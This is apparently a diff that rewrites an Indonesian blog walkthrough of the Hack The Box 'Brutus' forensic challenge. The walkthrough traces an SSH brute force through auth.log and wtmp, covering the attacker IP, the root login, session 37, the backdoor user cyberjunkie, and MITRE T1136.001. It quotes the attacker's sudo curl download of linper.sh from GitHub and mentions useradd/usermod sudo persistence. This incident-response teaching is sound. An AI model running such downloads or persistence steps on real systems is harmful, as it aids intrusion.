@@ -1,161 +1,161 @@
 ---
-title: "Brutus HTB"
+title: "Ungkap SSH Brute Force Lewat Log Auth dan Wtmp Bareng Brutus HTB"
 date: 2026-03-04 00:00:00 +0700
-categories: [Blue Team, CTF, Logs, Forensic]
+categories: [Blue Team, CTF, Forensik, Linux]
 authors: [fachri]
-tags: [Hack The Box, SSH Brute Force, Auth Log, Linux Forensic]
+tags: [Hack The Box, SSH Brute Force, Auth Log, Linux Forensic, Wtmp, Incident Response, MITRE ATT&CK]
 toc: true
 comments: false
-description: Walkthrough forensic Brutus dari HackTheBox — analisis auth.log dan wtmp untuk melacak SSH brute force, persistence, dan privilege escalation.
+description: "Walkthrough forensic Brutus HTB: analisis auth.log dan wtmp untuk melacak SSH brute force, persistence user, dan privilege escalation. Teknik Linux forensic lengkap."
 media_subpath: /content/img/BrutusHTB
 ---
-<!-- Image path: /content/img/BrutusHTB/ -->
-# Brutus Hack The Box
+
+# SSH Brute Force Terungkap: Walkthrough Forensic Brutus dari Hack The Box
 
 ![Cover challenge Brutus HackTheBox](10.png)
+
+Bayangin lo punya Confluence server yang kebuka SSH-nya ke publik. Suatu pagi lo cek auth.log dan nemu ribuan baris Failed Password. Jelas kena brute force. Tapi yang lebih serem: di antara semua percobaan itu, ada satu yang berhasil. Dan attacker udah bikin user baru, ngasih sudo, dan download script.
+
+Ini skenario dari **Brutus** Sherlock di Hack The Box. Level Very Easy, tapi jangan remehin. Justru dari kasus simpel kayak gini lo bisa belajar gimana attacker bergerak setelah dapet akses. Auth.log bukan cuma buat deteksi brute force, tapi juga buat backtrack seluruh aktivitas attacker: dari login, persistence, sampe command execution.
 
 ## Deskripsi Soal
 
 In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.
 
-### Soal 1
+### Soal 1: IP Attacker
 
 Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?
 
-#### Penjelasan 
-Disini kita harus mencari IP dari penyerang yang menyerang server 
+**Penjelasan:**
+
+Cari IP yang paling banyak melakukan percobaan login gagal. Di auth.log, setiap percobaan SSH dicatat dengan format:
+
+```
+Failed password for [user] from [IP] port [port] ssh2
+```
 
 ![auth.log menampilkan IP 65.2.161.68 melakukan SSH brute force](1.png)
 
-Jika kita lihat auth.log terdapat log yang dimana ketika penyerang melakukan brute force IP dari penyerang terekam di log tersebut
+**Jawaban:** `65.2.161.68`
 
-#### Jawaban
-
-65.2.161.68
-
-### Soal 2
+### Soal 2: Username yang Berhasil Login
 
 The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?
 
-#### Penjelasan 
-Disini kita harus mencari username akun apa yang berhasil login di server
+**Penjelasan:**
+
+Cari baris `Accepted password`. Ini indikasi brute force berhasil. Dari semua percobaan yang ada, yang berhasil login cuma satu:
 
 ![Log Accepted password untuk user root dari IP attacker](2.png)
 
-Jika kita lihat auth.log, username yang berhasil login ke dalam server adalah username root 
+**Jawaban:** `root`
 
-#### Jawaban
-root
-### Soal 3
+### Soal 3: Timestamp Login Manual (wtmp)
 
 Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.
 
-#### Penjelasan
-Di Soal ini kita harus mencari waktu dimana Attacker login secara manual di server dengan format waktu UTC (Coordinated Universal Time)
+**Penjelasan:**
 
-di soal kita sudah diberikan script python untuk mengubah file wtmp ke format yang mudah di baca
+Auth.log cuma nyatet percobaan autentikasi. Tapi kapan attacker beneran dapet akses terminal? Informasi ini ada di **wtmp**, file binary yang nyatet historical login.
+
+Gunakan script Python yang dikasih di soal buat parse wtmp:
 
 ![Hasil parsing file wtmp menggunakan script Python](3.png)
 
-Dan jika kita perhatikan, Attacker Login pada 2024-03-06 13:32:45 melalui device IP attacker 65.2.161.68 
+Dari hasil parsing, attacker login manual dari IP `65.2.161.68` pada pukul **13:32:45** (waktu lokal WIB). Karena log disimpan di wtmp dalam format UTC, perlu dikonversi. WIB = UTC+7.
+
 ![Timestamp login attacker di wtmp dalam format WIB](4.png)
 
-Dikarenakan kali linux saya menggunakan timezone WIB, maka kita perlu mengubah waktunya
+> Waktu Indonesia Barat (WIB) adalah UTC+7. Artinya WIB lebih cepat 7 jam dari UTC. Konversi: kurangi 7 jam dari WIB.
 
->Waktu Indonesia Barat (WIB) adalah UTC+7, yang berarti WIB lebih cepat 7 jam daripada UTC. Untuk konversi, kurangi 7 jam dari waktu WIB (WIB - 7 jam = UTC). Sebaliknya, tambahkan 7 jam ke waktu UTC (UTC + 7 jam = WIB)
+13:32:45 WIB - 7 jam = **06:32:45 UTC**
 
-#### Jawaban
-2024-03-06 06:32:45
-### Soal 4
+**Jawaban:** `2024-03-06 06:32:45`
+
+### Soal 4: Session Number
 
 SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
 
-#### Penjelasan 
-Pada Soal ini, Kita harus mencari session number yang terbuka ketika attacker berhasil login
+**Penjelasan:**
+
+Cari `session opened` buat user root di auth.log. Setiap login SSH dikasih session ID unik.
 
 ![auth.log menunjukkan session 37 terbuka untuk user root](5.png)
 
-Jika kita lihat di auth.log, disini session yang terbuka ketika attacker berhasil login adalah session 37
-#### Jawaban
+Session yang dipake: **37**.
 
-37
+**Jawaban:** `37`
 
-### Soal 5
+### Soal 5: User Persistence
 
 The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
 
-#### Penjelasan 
+**Penjelasan:**
 
-Pada soal ini, Kita mencari username yang baru di buat oleh attacker untuk mendapatkan akses persisten di dalam server dan akses yang lebih tinggi
+Attacker gak cuma login terus keluar. Dia bikin backdoor dengan cara nambah user baru dan ngasih akses sudo. Cek auth.log buat aktivitas `useradd`:
 
 ![Log pembuatan user cyberjunkie dan pemberian akses sudo](6.png)
 
-jika kita lihat auth.log, terdapat log yang dimana attacker membuat user baru bernama cyberjunkie dan memberikan akses sudo pada user tersebut
+User baru: **cyberjunkie**. Udah dikasih akses sudo juga lewat `usermod -aG sudo`.
 
-#### Jawaban
+**Jawaban:** `cyberjunkie`
 
-cyberjunkie
-
-### Soal 6
+### Soal 6: MITRE ATT&CK ID
 
 What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?
 
-#### Penjelasan 
+**Penjelasan:**
 
-Disini kita mencari sub teknik MITRE Attack dari serangan pembuatan akun tersebut 
+Pembuatan akun lokal buat persistence ini masuk ke framework **MITRE ATT&CK**. Teknik spesifiknya: [T1136.001](https://attack.mitre.org/techniques/T1136/001/): Create Account: Local Account.
 
 ![MITRE ATTACK halaman T1136.001 Local Account](11.png)
 
-Jika kita buka website https://attack.mitre.org/ terdapat teknik yang dimana user membuat account untuk akses ke akun korban namun, terdapat perbedaan tentang dimana akun itu di buat, dalam kasus ini attacker membuat user di server korban sehingga masuk kedalam kategori local account
+Ini masuk kategori persistence karena attacker bikin akun baru buat maintain akses.
 
-#### Jawaban
+**Jawaban:** `T1136.001`
 
-T1136.001
-
-### Soal 7
+### Soal 7: Waktu Session Berakhir
 
 What time did the attacker's first SSH session end according to auth.log?
 
-#### Penjelasan 
+**Penjelasan:**
 
-Disini kita harus mencari kapan user mengakhiri ssh session pertamanya berdasarkan dari auth.log
+Cari baris `session closed` buat session 37. Ini nandain kapan attacker logout atau koneksi SSH terputus.
 
 ![auth.log mencatat session 37 ditutup](8.png)
 
-Jika kita lihat dari log tersebut user mengakhiri SSH session nya pada 6 Maret Jam 06:37:24
-#### Jawaban
+**Jawaban:** `2024-03-06 06:37:24`
 
-2024-03-06 06:37:24
-
-### Soal 8
+### Soal 8: Command Execution via Sudo
 
 The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
 
-#### Penjelasan 
-Setelah Attacker Login menggunakan Akun yang telah dibuat,Dia menjalankan beberapa perintah untuk memperoleh akses yang lebih 
+**Penjelasan:**
+
+Setelah login pake user cyberjunkie, attacker ngejalanin command via sudo buat download script. Ini tercatat di auth.log.
 
 ![Log eksekusi curl untuk download linper.sh via sudo](9.png)
 
-Attacker menjalankan command 
+Command yang dijalankan:
 
-```Bash
-curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+```bash
+sudo /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
 ```
-Di Binaries Local
-#### Jawaban
 
-/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+`linper.sh` adalah script Linux privilege escalation checker. Attacker pake ini buat nyari celah naikin akses lebih tinggi.
 
-## Kesimpulan Pembelajaran
+**Jawaban:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
 
-Kasus ini mendemonstrasikan bagaimana log sistem yang fundamental, seperti auth.log dan wtmp, dapat menjadi sumber informasi utama dalam investigasi insiden keamanan.
+## Kesimpulan
 
-Beberapa pelajaran dari proses investigasi tersebut :
+Dari satu file auth.log, kita bisa reconstruct hampir seluruh timeline serangan. Mulai dari IP attacker, username yang kena, session yang dipake, user backdoor yang dibuat, sampe command yang dijalankan. Ini penting banget buat incident response.
 
-1. auth.log bukan hanya berguna untuk mendeteksi serangan brute-force, tetapi juga sangat kaya informasi untuk melacak aktivitas pasca-eksploitasi seperti pembuatan akun baru (persistence), penggunaan hak istimewa (sudo), dan eksekusi perintah.
+Yang menarik: attacker pake teknik brute force klasik, tapi setelah dapet akses dia gak langsung ngaco. Dia bikin user baru, sudo-in, trus jalanin script enumerasi. Ini pola yang umum di serangan real: attacker masuk, ngecek environment, trus nentuin langkah berikutnya.
 
-2. Memahami Korelasi Data dari Berbagai Sumber.Investigasi ini menggabungkan data dari dua file log berbeda (auth.log dan wtmp) untuk mendapatkan gambaran yang lebih lengkap, mulai dari percobaan autentikasi, sesi yang sukses, hingga durasi sesi tersebut.
+### Takeaway Teknis
 
-3. Pemetaan ke MITRE ATT&CK dengan Mengaitkan taktik attacker (membuat akun lokal) dengan ID teknik yang spesifik (T1136.001) membantu dalam memahami konteks serangan dalam kerangka industri yang diakui.
-
-Secara keseluruhan, "Brutus HTB" memberikan pengalaman langsung yang berharga tentang bagaimana seorang analis keamanan dapat memanfaatkan log sistem untuk menyelidiki insiden, bahkan dari serangan yang relatif sederhana sekalipun.
+1. **Auth.log adalah sumber utama** buat deteksi brute force SSH. Cari pola `Failed password` dari IP yang sama dalam jumlah banyak.
+2. **Wtmp** nyimpen historical login yang lebih akurat dari auth.log. Berguna buat korelasi timestamp login.
+3. **Session ID di auth.log** ngebantu lo track aktivitas attacker dari login sampe logout dalam satu sesi.
+4. **User persistence** bisa dideteksi lewat log `useradd` dan `usermod`. Attacker biasanya bikin akun baru dengan nama yang gak mencolok.
+5. **Pemetaan MITRE ATT&CK** membantu lo klasifikasi serangan ke dalam framework industri. T1136.001 untuk local account creation.
